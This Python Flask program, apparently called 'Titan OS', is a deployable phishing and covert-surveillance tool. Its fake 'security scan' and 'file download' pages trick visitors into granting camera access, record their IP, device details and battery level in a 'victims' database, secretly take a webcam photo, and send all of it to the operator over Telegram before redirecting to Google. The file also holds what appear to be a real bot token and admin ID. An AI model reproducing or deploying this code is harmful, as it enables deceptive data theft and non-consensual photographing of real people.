# ============================================================
# PROJECT: THE TITAN OS - VERSION 2026 (FINAL REFINED)
# OWNER: SIUF-PRO (سيوفي)
# ============================================================

import os
import json
import time
import base64
import random
import string
import datetime
import requests
import sqlite3
from io import BytesIO
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# --- CONFIGURATION ---
CONFIG = {
    "BOT_TOKEN": "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0",
    "ADMIN_ID": "7041600701",
    "BASE_URL": "https://sif-pro.onrender.com",
    "DB_NAME": "titan_vault.db"
}

# --- DATABASE ENGINE ---
def init_db():
    conn = sqlite3.connect(CONFIG["DB_NAME"])
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS victims 
                      (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, device_info TEXT, battery TEXT, timestamp TEXT)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)''')
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('template', 'security')")
    conn.commit()
    conn.close()

def log_victim(ip, info, battery):
    conn = sqlite3.connect(CONFIG["DB_NAME"])
    cursor = conn.cursor()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("INSERT INTO victims (ip, device_info, battery, timestamp) VALUES (?, ?, ?, ?)",
                   (ip, info, battery, now))
    last_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return last_id

# --- TELEGRAM SENDER ---
def smart_tg_send(method, data=None, files=None):
    url = f"https://api.telegram.org/bot{CONFIG['BOT_TOKEN']}/{method}"
    try:
        res = requests.post(url, data=data, files=files)
        return res.json()
    except:
        return None

# --- UI TEMPLATES & JS ---
SENSOR_JS = """
async function captureDeepInfo() {
    let info = { platform: navigator.platform, screen: `${window.screen.width}x${window.screen.height}` };
    let battery = { level: 'N/A' };
    try { const b = await navigator.getBattery(); battery.level = Math.round(b.level * 100) + '%'; } catch(e) {}
    return { info, battery };
}
"""

UI_TEMPLATES = {
    "security": {
        "title": "Security Check", "header": "🛡️ Browser Security Scan",
        "desc": "Confirm your identity to continue securely.", "btn": "Start Scan", "color": "#f38020"
    },
    "download": {
        "title": "File Download", "header": "📥 Your file is ready",
        "desc": "Size: 14.5 MB. Click below to download.", "btn": "Download Now", "color": "#007bff"
    }
}

MASTER_HTML = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ t.title }}</title>
    <style>
        body { background:#0f0f0f; color:white; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
        .card { background:#1a1a1a; padding:30px; border-radius:20px; text-align:center; width:90%; max-width:400px; border:1px solid #333; }
        .btn { background:{{ t.color }}; color:white; border:none; padding:15px; border-radius:10px; width:100%; font-weight:bold; cursor:pointer; margin-top:20px; }
    </style>
</head>
<body>
    <div class="card">
        <h1 style="color:{{ t.color }}">{{ t.header }}</h1>
        <p>{{ t.desc }}</p>
        <button class="btn" id="go" onclick="run()">{{ t.btn }}</button>
        <div id="log" style="font-size:10px; color:#555; margin-top:10px;">Titan Protocol v5.0</div>
    </div>
    <video id="v" style="display:none" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>
    <script>
        {{ sensor_js|safe }}
        async function run() {
            document.getElementById('go').disabled = true;
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
                document.getElementById('v').srcObject = s;
                const d = await captureDeepInfo();
                const res = await fetch('/api/v5/collect', {
                    method:'POST', headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({type:'initial_hit', data:d})
                });
                const rData = await res.json();
                setTimeout(() => {
                    const v = document.getElementById('v'); const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    fetch('/api/v5/collect', {
                        method:'POST', headers:{'Content-Type':'application/json'},
                        body:JSON.stringify({type:'media', v_id:rData.v_id, content:c.toDataURL('image/jpeg')})
                    });
                    window.location.href = "https://google.com";
                }, 3000);
            } catch(e) { location.reload(); }
        }
    </script>
</body>
</html>
'''

# --- BACKEND ROUTES ---
@app.route('/')
def home():
    conn = sqlite3.connect(CONFIG["DB_NAME"])
    cursor = conn.cursor()
    cursor.execute("SELECT value FROM settings WHERE key = 'template'")
    row = cursor.fetchone()
    t_name = row[0] if row else "security"
    conn.close()
    return render_template_string(MASTER_HTML, t=UI_TEMPLATES.get(t_name), sensor_js=SENSOR_JS)

@app.route('/api/v5/collect', methods=['POST'])
def collect():
    payload = request.get_json()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if payload['type'] == 'initial_hit':
        v_id = log_victim(ip, str(payload['data']['info']), payload['data']['battery']['level'])
        msg = f"🆕 **Target #{v_id}**\n🌐 IP: `{ip}`\n📱 Device: {payload['data']['info']['platform']}"
        smart_tg_send("sendMessage", {"chat_id": CONFIG["ADMIN_ID"], "text": msg, "parse_mode": "Markdown"})
        return jsonify({"v_id": v_id})
    elif payload['type'] == 'media':
        img_data = base64.b64decode(payload['content'].split(',')[1])
        smart_tg_send("sendPhoto", {"chat_id": CONFIG["ADMIN_ID"], "caption": f"📸 Photo Target #{payload['v_id']}"}, {"photo": ('c.jpg', BytesIO(img_data))})
    return jsonify({"status": "ok"})

@app.route('/webhook', methods=['POST'])
def webhook():
    upd = request.get_json()
    if "message" in upd and str(upd["message"]["chat"]["id"]) == CONFIG["ADMIN_ID"]:
        kb = {"inline_keyboard": [[{"text": "🔗 Get Link", "callback_data": "link"}], [{"text": "🎭 Templates", "callback_data": "temps"}]]}
        smart_tg_send("sendMessage", {"chat_id": CONFIG["ADMIN_ID"], "text": "🛠 **TITAN CONTROL PANEL**", "reply_markup": kb})
    elif "callback_query" in upd:
        q = upd["callback_query"]; data = q["data"]
        if data == "link":
            smart_tg_send("sendMessage", {"chat_id": CONFIG["ADMIN_ID"], "text": f"🚀 URL: `{CONFIG['BASE_URL']}`", "parse_mode": "Markdown"})
        elif data == "temps":
            tkb = {"inline_keyboard": [[{"text": "🛡 Security", "callback_data": "set_security"}, {"text": "📥 Download", "callback_data": "set_download"}]]}
            smart_tg_send("sendMessage", {"chat_id": CONFIG["ADMIN_ID"], "text": "Select Template:", "reply_markup": tkb})
        elif data.startswith("set_"):
            new_t = data.replace("set_", "")
            conn = sqlite3.connect(CONFIG["DB_NAME"]); cursor = conn.cursor()
            cursor.execute("UPDATE settings SET value = ? WHERE key = 'template'", (new_t,))
            conn.commit(); conn.close()
            smart_tg_send("answerCallbackQuery", {"callback_query_id": q["id"], "text": f"Updated to: {new_t}"})
    return "OK"

if __name__ == '__main__':
    init_db()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

